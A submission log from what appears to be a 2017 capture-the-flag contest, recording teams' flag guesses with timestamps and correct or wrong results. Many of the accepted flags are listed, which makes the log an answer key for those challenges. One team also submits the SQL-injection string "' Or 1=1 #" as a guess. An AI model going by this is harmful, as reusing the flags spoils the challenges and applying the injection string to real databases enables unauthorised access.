[05/07/2017 00:23:40] Flyteam0 submitted flag{655397} with kpm 12 [TOO FAST]
[05/07/2017 00:23:40] Flyteam0 submitted flag{6553977} with kpm 13 [TOO FAST]
[05/07/2017 00:23:40] Flyteam0 submitted flag{6553977} with kpm 14 [TOO FAST]
[05/07/2017 00:23:40] Flyteam0 submitted flag{6553977} with kpm 15 [TOO FAST]
[05/07/2017 00:23:41] Flyteam0 submitted flag{6553977} with kpm 16 [TOO FAST]
[05/07/2017 00:23:42] Flyteam0 submitted flag{6553977} with kpm 17 [TOO FAST]
[05/07/2017 00:23:43] Flyteam0 submitted flag{6553977} with kpm 18 [TOO FAST]
[05/07/2017 00:23:44] Flyteam0 submitted flag{6553977} with kpm 19 [TOO FAST]
[05/07/2017 00:23:57] Flyteam0 submitted flag{6553977} with kpm 20 [TOO FAST]
[05/07/2017 00:25:02] 冰血封情 submitted bea5ce1ed45a6651 with kpm 0 [WRONG]
[05/07/2017 00:25:11] 董天董地董蛤 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/07/2017 00:25:17] 冰血封情 submitted 559776dbbea5ce1ed45a6651f852b912 with kpm 1 [WRONG]
[05/07/2017 00:25:39] zzz submitted flag{c8q924dj694dq4f44c897qq19q9dd94d} with kpm 0 [WRONG]
[05/07/2017 00:25:43] 冰血封情 submitted flag{559776dbbea5ce1ed45a6651f852b912} with kpm 2 [WRONG]
[05/07/2017 00:26:17] 冰血封情 submitted flag{bea5ce1ed45a6651} with kpm 2 [WRONG]
[05/07/2017 00:26:18] 死亡地平线 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/07/2017 00:26:33] 死亡地平线 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/07/2017 00:26:43] 死亡地平线 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 2 [WRONG]
[05/07/2017 00:26:45] Flyteam4 submitted flag{c2df6facc79fb9c477312fd27f7adbbe} with kpm 0 [CORRECT]
[05/07/2017 00:27:40] 冰血封情 submitted flag{6FC910E1F9F6248B9459DA4541D54FD8} with kpm 0 [WRONG]
[05/07/2017 00:28:06] 冰血封情 submitted flag{F9F6248B9459DA45} with kpm 1 [WRONG]
[05/07/2017 00:28:21] Flyteam2 submitted flag{c2df6facc79fb9c477312fd27f7adbbe} with kpm 0 [CORRECT]
[05/07/2017 00:28:25] Flyteam5 submitted flag{1tsvErYe0Sy!} with kpm 0 [CORRECT]
[05/07/2017 00:28:42] Flyteam3 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/07/2017 00:29:15] 冰血封情 submitted flag{6fc910e1f9f6248b9459da4541d54fd8} with kpm 0 [WRONG]
[05/07/2017 00:29:19] Flyteam0 submitted flag{c2df6facc79fb9c477312fd27f7adbbe} with kpm 0 [CORRECT]
05/07/2017 00:29:29 submitted Flyteam0 with kpm flag{c2df6facc79fb9c477312fd27f7adbbe} [ALREADY SOLVED]
[05/07/2017 00:29:39] 冰血封情 submitted flag{f9f6248b9459da45} with kpm 1 [WRONG]
[05/07/2017 00:29:40] Flyteam4 submitted flag{bacongncodeandzeroone} with kpm 0 [WRONG]
[05/07/2017 00:30:37] Flyteam3 submitted flag{c2df6facc79fb9c477312fd27f7adbbe} with kpm 0 [CORRECT]
[05/07/2017 00:31:14] Flyteam1 submitted flag{c2df6facc79fb9c477312fd27f7adbbe} with kpm 0 [CORRECT]
[05/07/2017 00:31:53] 死亡地平线 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/07/2017 00:35:03] Flyteam4 submitted flag{bacongncodeandzeroone} with kpm 0 [WRONG]
[05/07/2017 00:35:07] 不晓得取啥队伍名 submitted flag{baconencodeandznroone} with kpm 0 [WRONG]
[05/07/2017 00:35:17] 不晓得取啥队伍名 submitted flagbaconencodeandznroone with kpm 1 [WRONG]
[05/07/2017 00:35:23] 不晓得取啥队伍名 submitted flag}baconencodeandznroone} with kpm 2 [WRONG]
[05/07/2017 00:35:27] test submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/07/2017 00:35:35] 冰血封情 submitted flag{LGMZKVLJKWKVKZNGNFLFNFKZNGK LFKVNFK TKLFSVNGNFLF} with kpm 0 [WRONG]
[05/07/2017 00:35:48] 冰血封情 submitted flag{LGMZKVLJKWKVKZNGNFLFNFKZNGKLFKVNFKTKLFSVNGNFLF} with kpm 1 [WRONG]
[05/07/2017 00:36:14] 法兰街舞队 submitted flag{1tsvErCe0Sy!} with kpm 0 [WRONG]
[05/07/2017 00:37:08] 死亡地平线 submitted flag with kpm 0 [WRONG]
[05/07/2017 00:37:14] 死亡地平线 submitted flag{flase} with kpm 1 [WRONG]
[05/07/2017 00:37:17] 西石油三队 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/07/2017 00:37:22] 法兰街舞队 submitted flag{1tsvErCe0Sy!} with kpm 0 [WRONG]
[05/07/2017 00:37:27] 死亡地平线 submitted flag{false} with kpm 2 [WRONG]
[05/07/2017 00:37:49] Flyteam5 submitted flag{bacongncodeandzeroone} with kpm 0 [WRONG]
[05/07/2017 00:38:14] 法兰街舞队 submitted flag{1tsvErye0Sy!} with kpm 1 [CORRECT]
[05/07/2017 00:39:30] Flyteam1 submitted flag{' Or 1=1 #} with kpm 0 [WRONG]
[05/07/2017 00:39:42] Flyteam1 submitted ' Or 1=1 # with kpm 1 [WRONG]
[05/07/2017 00:39:48] 法兰街舞队 submitted flag{baconencodeandzeroone} with kpm 0 [WRONG]
[05/07/2017 00:40:00] 法兰街舞队 submitted flag{baconencodeandzeroone} with kpm 1 [CORRECT]
[05/07/2017 00:40:27] 冰血封情 submitted flag{6FC910E1F9F6248B9459DA4541D54FD8} with kpm 0 [WRONG]
[05/07/2017 00:40:57] 死亡地平线 submitted flag{falsefalse} with kpm 0 [WRONG]
[05/07/2017 00:41:02] 死亡地平线 submitted flag{falsefalsefalse} with kpm 1 [WRONG]
[05/07/2017 00:44:29] Flyteam4 submitted flag{bacnmgmcndeamdxernnme} with kpm 0 [WRONG]
[05/07/2017 00:45:00] Flyteam1 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/07/2017 00:45:05] 不晓得取啥队伍名 submitted flag{BACON} with kpm 0 [WRONG]
[05/07/2017 00:45:52] 董天董地董蛤 submitted flag{c8a924de694da4f44c897aa19a9dd94d} with kpm 0 [CORRECT]
[05/07/2017 00:48:17] Flyteam0 submitted flag{mortal} with kpm 0 [WRONG]
[05/07/2017 00:48:54] Flyteam4 submitted flag{bacnmgmcndeamdxeqnnme} with kpm 0 [WRONG]
[05/07/2017 00:49:10] Flyteam4 submitted flag{bacnmgmcndeamdxeqnnme} with kpm 1 [WRONG]
[05/07/2017 00:50:10] Flyteam0 submitted flag{bacongncodeandzeroone} with kpm 0 [WRONG]
[05/07/2017 00:50:31] Flyteam0 submitted flag{flagbacongncodeandzeroone} with kpm 1 [WRONG]
[05/07/2017 00:50:36] Flyteam0 submitted flagbacongncodeandzeroone with kpm 2 [WRONG]
[05/07/2017 00:50:43] Flyteam0 submitted flagbacongncodeandzeroone with kpm 3 [WRONG]
[05/07/2017 00:50:48] Flyteam0 submitted flag{bacongncodeandzeroone} with kpm 4 [WRONG]
[05/07/2017 00:51:35] 不晓得取啥队伍名 submitted flag{baconencodeandzeroonf} with kpm 0 [WRONG]
[05/07/2017 00:51:36] Flyteam4 submitted flag{baconcodeandzeroone} with kpm 0 [WRONG]
[05/07/2017 00:51:42] Flyteam4 submitted flag{bacongcodeandzeroone} with kpm 1 [WRONG]
[05/07/2017 00:51:44] 不晓得取啥队伍名 submitted flag{baconencodeandzeroenf} with kpm 1 [WRONG]
[05/07/2017 00:51:49] 不晓得取啥队伍名 submitted flag{baconencodeandzeroend} with kpm 2 [WRONG]
[05/07/2017 00:51:52] 不晓得取啥队伍名 submitted flagbaconencodeandzeroend with kpm 3 [WRONG]
[05/07/2017 00:52:12] 不晓得取啥队伍名 submitted flag{baconencodeandzeroend} with kpm 4 [WRONG]
[05/07/2017 00:52:30] 不晓得取啥队伍名 submitted flag{baconencodeandzeroone} with kpm 5 [CORRECT]
[05/07/2017 00:52:50] Flyteam5 submitted flag{bacongncodeandzeroone} with kpm 0 [WRONG]
[05/07/2017 00:52:54] Flyteam5 submitted flag{c2df6facc79fb9c477312fd27f7adbbe} with kpm 1 [CORRECT]
[05/07/2017 00:52:56] Flyteam4 submitted bacongncodeandzeroone with kpm 0 [WRONG]
[05/07/2017 00:53:13] Flyteam4 submitted flag(bacongncodeandzeroone) with kpm 1 [WRONG]
[05/07/2017 00:53:21] Flyteam4 submitted flag{bacongncodeandzeroone} with kpm 2 [WRONG]
[05/07/2017 00:54:48] ThreeNB submitted flag{welcome_to_ISA} with kpm 0 [WRONG]
[05/07/2017 00:55:01] ThreeNB submitted flag{welcome_To_ISA} with kpm 1 [WRONG]
[05/07/2017 00:55:14] 抽象二队 submitted flag{0u77057549uz06647zyw8z0y4089uz8z} with kpm 0 [WRONG]
[05/07/2017 00:55:30] 西石油三队 submitted flag{ljmvkvuvlknjmzngnflfnfkzngk{lfkvnfk{tklfsvngngnflf} with kpm 0 [WRONG]
[05/07/2017 00:55:41] 抽象二队 submitted flag{0	u	7	7	0	5	7	5	4	9	u	z	0	6	6	4 7	z	y	w	8	z	0	y	4	0	8	9	u	z	8	z} with kpm 1 [WRONG]
[05/07/2017 00:57:11] ThreeNB submitted flag{welcome_To_IsA} with kpm 0 [WRONG]
[05/07/2017 00:57:16] ThreeNB submitted flag{welcome_To_Isa} with kpm 1 [WRONG]
[05/07/2017 00:57:23] ThreeNB submitted flag{welcome_To_ISa} with kpm 2 [WRONG]
[05/07/2017 00:57:43] ThreeNB submitted flag{welcome_TO_ISA} with kpm 3 [WRONG]
[05/07/2017 00:58:02] ThreeNB submitted flag{welcome_To_IsA} with kpm 4 [WRONG]
[05/07/2017 00:58:07] Flyteam0 submitted flag{bacnmgmcndeamdxeqnnme} with kpm 0 [WRONG]
[05/07/2017 00:58:21] ThreeNB submitted flag{welcome_To_isA} with kpm 3 [WRONG]
[05/07/2017 00:58:31] ThreeNB submitted flag{welcome_tO_isA} with kpm 3 [WRONG]
[05/07/2017 00:59:27] ThreeNB submitted flag{welcome_to_isa} with kpm 1 [WRONG]
[05/07/2017 01:00:48] ThreeNB submitted flag{welcome_tO_isa} with kpm 0 [WRONG]
[05/07/2017 01:00:55] ThreeNB submitted flag{welcome_tO_Isa} with kpm 1 [WRONG]
[05/07/2017 01:01:19] ThreeNB submitted flag{welcome_tO_IsA} with kpm 2 [WRONG]
[05/07/2017 01:02:33] 西石油三队 submitted flag{ljmvkvuvlknjmzngnflfnfkzngklfkvnfktklfsvngngnflf} with kpm 0 [WRONG]
[05/07/2017 01:02:45] ThreeNB submitted flag{welcome_tO_ISA} with kpm 0 [WRONG]
[05/07/2017 01:02:46] 西石油三队 submitted flag{mknxlxwxmloknogofmfofloglmflxofluvlmftxogogofmf} with kpm 1 [WRONG]
[05/07/2017 01:03:42] 不晓得取啥队伍名 submitted  with kpm 0 [WRONG]
[05/07/2017 01:03:50] 死亡地平线 submitted flag with kpm 0 [WRONG]
[05/07/2017 01:03:53] 死亡地平线 submitted flag{ } with kpm 1 [WRONG]
[05/07/2017 01:04:20] ThreeNB submitted flag with kpm 0 [WRONG]
[05/07/2017 01:04:24] 不晓得取啥队伍名 submitted flag{tree} with kpm 1 [WRONG]
[05/07/2017 01:04:27] ThreeNB submitted flag{0f77057549fa06647abd8a0b4089fa8a} with kpm 1 [CORRECT]
[05/07/2017 01:04:31] ThreeNB submitted flag{welcome_To_Isa} with kpm 1 [WRONG]
[05/07/2017 01:04:56] 冰血封情 submitted flag{failed failed failed failed} with kpm 0 [WRONG]
[05/07/2017 01:05:08] 冰血封情 submitted flag{failed failed failed failed failed} with kpm 1 [WRONG]
[05/07/2017 01:05:20] 冰血封情 submitted flag{failed failed failed failed failed failed} with kpm 2 [WRONG]
05/07/2017 01:07:00 submitted 不晓得取啥队伍名 with kpm flag{BACON} [ALREADY SOLVED]
[05/07/2017 01:07:24] 西石油三队 submitted flag{ljmvkvuvlknjmzngnflfnfkzngklfkvnfktklfsvngngnflf} with kpm 0 [WRONG]
[05/07/2017 01:09:01] ThreeNB submitted flag{welcome_To_IsA} with kpm 0 [WRONG]
[05/07/2017 01:09:20] ThreeNB submitted flag{welcome_to_IsA} with kpm 1 [WRONG]
[05/07/2017 01:09:30] Flyteam4 submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/07/2017 01:10:17] Flyteam3 submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/07/2017 01:10:32] Flyteam2 submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/07/2017 01:10:41] 冰血封情 submitted flag{failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed } with kpm 0 [WRONG]
[05/07/2017 01:11:19] ThreeNB submitted flag{welcome_to_IsAac} with kpm 0 [WRONG]
[05/07/2017 01:11:30] ThreeNB submitted flag{welcome_to_IsAaC} with kpm 1 [WRONG]
[05/07/2017 01:11:51] 冰血封情 submitted flag{failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed} with kpm 0 [WRONG]
[05/07/2017 01:12:33] Flyteam5 submitted flag{bacongncodeandzeroone} with kpm 0 [WRONG]
[05/07/2017 01:12:37] Flyteam5 submitted flag{baconencodeandzeroone} with kpm 1 [CORRECT]
[05/07/2017 01:13:20] ThreeNB submitted flag{welcome_TO_sICnuISA} with kpm 0 [WRONG]
[05/07/2017 01:13:55] ThreeNB submitted flag{welcome_TO_slCnuISA} with kpm 1 [WRONG]
[05/07/2017 01:14:08] ThreeNB submitted flag{welcome_TO_slCnuISA} with kpm 2 [WRONG]
[05/07/2017 01:14:48] ThreeNB submitted flag{welcome_T0_sICnuISA} with kpm 2 [CORRECT]
[05/07/2017 01:17:01] 笑傲江湖 submitted flag{0f77057549fa06647abd8a0b4089fa8a} with kpm 0 [CORRECT]
[05/07/2017 01:17:58] 三脸懵逼 submitted flag{0f77057549fa06647abd8a0b4089fa8a} with kpm 0 [CORRECT]
[05/07/2017 01:20:01] 不晓得取啥队伍名 submitted flag{Of77057549fa06647abd8aOb4O89fa8a} with kpm 0 [WRONG]
[05/07/2017 01:20:08] 不晓得取啥队伍名 submitted flag{Of77057549fa06647abd8a0b4089fa8a} with kpm 1 [WRONG]
[05/07/2017 01:20:15] 不晓得取啥队伍名 submitted flag{0f77057549fa06647abd8a0b4089fa8a} with kpm 2 [CORRECT]
[05/07/2017 01:21:06] 6602 submitted flag{6595b64144ccf1df} with kpm 0 [WRONG]
[05/07/2017 01:21:17] 6602 submitted 6595b64144ccf1df with kpm 1 [WRONG]
[05/07/2017 01:26:55] ThreeNB submitted flag with kpm 0 [WRONG]
[05/07/2017 01:27:10] ThreeNB submitted flag{tree} with kpm 1 [WRONG]
[05/07/2017 01:27:16] ThreeNB submitted flag{itree} with kpm 2 [WRONG]
[05/07/2017 01:27:19] ThreeNB submitted flag{ilovetree} with kpm 3 [WRONG]
[05/07/2017 01:27:26] ThreeNB submitted flag{ilove_tree} with kpm 4 [WRONG]
[05/07/2017 01:27:32] ThreeNB submitted flag{i_love_tree} with kpm 5 [WRONG]
[05/07/2017 01:28:33] 冰血封情 submitted flag{failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed failed } with kpm 0 [WRONG]
[05/07/2017 01:28:49] 冰血封情 submitted flag{1 } with kpm 1 [WRONG]
[05/07/2017 01:28:55] 冰血封情 submitted flag{0 } with kpm 2 [WRONG]
[05/07/2017 01:29:09] 冰血封情 submitted flag{success } with kpm 3 [WRONG]
[05/07/2017 01:29:17] 冰血封情 submitted flag{failed } with kpm 4 [WRONG]
[05/07/2017 01:30:21] zzz submitted flag{round_or_cut_is_dangerous} with kpm 0 [CORRECT]
[05/07/2017 01:32:11] 抽象二队 submitted flag{0f77057549fa06647abd8a0b4089fa8a} with kpm 0 [CORRECT]
[05/07/2017 01:32:25] 董天董地董蛤 submitted flag{tver_Es_S0_wud} with kpm 0 [CORRECT]
[05/07/2017 01:34:28] 笑傲江湖 submitted flag{1tsvErYe0Sy!} with kpm 0 [CORRECT]
[05/07/2017 01:35:32] 抽象二队 submitted flag{1tsvErYe0Sy!} with kpm 0 [CORRECT]
[05/07/2017 01:35:52] 冰血封情 submitted flag{20} with kpm 0 [WRONG]
[05/07/2017 01:36:02] zzz submitted flag(baconencodeandzeroone) with kpm 0 [WRONG]
[05/07/2017 01:36:10] zzz submitted flag{baconencodeandzeroone} with kpm 1 [CORRECT]
[05/07/2017 01:36:10] 冰血封情 submitted flag{Reverse} with kpm 1 [WRONG]
[05/07/2017 01:36:21] WHT submitted flag{1tsvErYe0Sy!} with kpm 0 [CORRECT]
[05/07/2017 01:36:26] 冰血封情 submitted flag{easy} with kpm 2 [WRONG]
[05/07/2017 01:36:57] 冰血封情 submitted flag{key} with kpm 2 [WRONG]
[05/07/2017 01:37:07] 冰血封情 submitted flag{11111111} with kpm 3 [WRONG]
[05/07/2017 01:37:48] 冰血封情 submitted flag{dao} with kpm 2 [WRONG]
[05/07/2017 01:39:08] 冰血封情 submitted flag{1} with kpm 0 [WRONG]
[05/07/2017 01:40:44] 三脸懵逼 submitted flag{sqli_&_url_include_on}  with kpm 0 [CORRECT]
[05/07/2017 01:48:53] 不晓得取啥队伍名 submitted  with kpm 0 [WRONG]
[05/07/2017 01:55:10] 6602 submitted flag{sqli_&_url_include_on} with kpm 0 [CORRECT]
[05/07/2017 01:55:29] 董天董地董蛤 submitted flag{kflyjukijvjujymfmekemejymfjzkejumejzsjkerumfmfmeke} with kpm 0 [WRONG]
[05/07/2017 01:57:13] 董天董地董蛤 submitted flag{kflyjukijvjujymfmekemejymfjzkejumejzsjkerumfmfmeke} with kpm 0 [WRONG]
[05/07/2017 01:57:18] 董天董地董蛤 submitted flag{kflyjukijvjujymfmekemejymfjzkejumejzsjkerumfmfmeke} with kpm 1 [WRONG]
